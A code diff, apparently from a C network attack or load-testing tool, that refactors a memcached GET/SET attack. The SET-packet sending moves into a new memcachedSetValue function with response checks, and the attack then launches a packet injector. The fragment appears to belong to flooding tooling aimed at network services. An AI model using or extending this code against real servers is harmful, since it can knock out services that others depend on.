@@ -13,6 +13,29 @@
 
 #define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT
 
+void memcachedSetValue( AttackPlan * p_atkData )
+{
+    int sock = CreateSocket(TCP, BLOCK);
+    BinaryResponseHeader response;
+
+    ConnectTCP(sock, p_atkData->setPacket);
+    for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
+    {
+        if( SendPacket(sock, tmpPkt) < 0 )
+        {
+            Efatal(ERROR_MEMCACHED, "error memcached\n");
+        }
+
+        recv(sock, &response, sizeof(BinaryResponseHeader), 0);
+        
+        if(response.status != 0)
+        {
+            Efatal(ERROR_MEMCACHED, "Error memcached: cannot set data\n");
+        }
+    }
+    CloseSocket(sock);
+}
+
 static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
 {
     AttackPlan *newData;
@@ -46,18 +69,8 @@ void executeAttack( AttackPlan * atkData )
     
     if(atkData->draft->type == MEMCACHED_GETSET)
     {
-        int sock = CreateSocket(TCP, BLOCK);
-        ConnectTCP(sock, atkData->setPacket);
-        for(Packet *tmpPkt = atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
-        {
-            if( SendPacket(sock, tmpPkt) < 0 )
-            {
-                Efatal(ERROR_MEMCACHED, "error memcached\n");
-            }   
-        }
-        CloseSocket(sock);
+        memcachedSetValue( atkData );
     }
-
     StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
 }
 
